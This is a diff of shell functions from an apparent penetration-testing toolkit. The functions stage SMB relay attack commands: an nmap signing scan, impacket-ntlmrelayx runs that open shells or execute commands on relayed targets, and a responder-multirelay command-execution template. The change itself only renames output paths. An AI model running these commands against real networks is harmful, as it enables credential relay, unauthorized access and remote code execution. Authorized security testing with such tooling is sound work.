@@ -32,7 +32,7 @@ nb-ad-smb-relay-enum() {
     __check-project
   	nb-vars-set-network
 
-    print -z "sudo grc nmap -v --script=smb2-security-mode -p 445 ${__NETWORK} -oA $(netadpath)/nmap-smb-security"
+    print -z "sudo grc nmap -v --script=smb2-security-mode -p 445 ${__NETWORK} -oA $(netpath)/nmap-smb-security"
 }
 
 nb-ad-smb-relay-ntlmrelay() {
@@ -58,7 +58,7 @@ nb-ad-smb-relay-ntlmrelay() {
 	  __ask "Enter a targets list file"
 	  local targets && __askvar targets TARGETS
 
-    print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support | tee $(__domadpath)/ntlmrelayx.txt"
+    print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support | tee $(__netpath)/ntlmrelayx.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay-shell() {
@@ -66,7 +66,7 @@ nb-ad-smb-relay-ntlmrelay-shell() {
 	  __ask "Enter a targets list file"
 	  local targets && __askvar targets TARGETS
 
-    print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support -i | tee $(__domadpath)/ntlmrelayx-shell.txt"
+    print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support -i | tee $(__netpath)/ntlmrelayx-shell.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay-command() {
@@ -75,7 +75,7 @@ nb-ad-smb-relay-ntlmrelay-command() {
 	  local targets && __askvar targets TARGETS
 	  local cm && __askvar cm COMMAND
 
-	  print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support -c '$cm' | tee $(__domadpath)/ntlmrelayx-command.txt"
+	  print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support -c '$cm' | tee $(__netpath)/ntlmrelayx-command.txt"
 }
 
 nb-ad-smb-relay-multirelay-command() {
@@ -85,5 +85,5 @@ nb-ad-smb-relay-multirelay-command() {
 	  __ask "Enter a shell command to execute"
 	  local command && __askvar command COMMAND
 
-	  print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee $(__domadpath)/responder-multirelay.txt"
+	  print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee $(__netpath)/responder-multirelay.txt"
 }
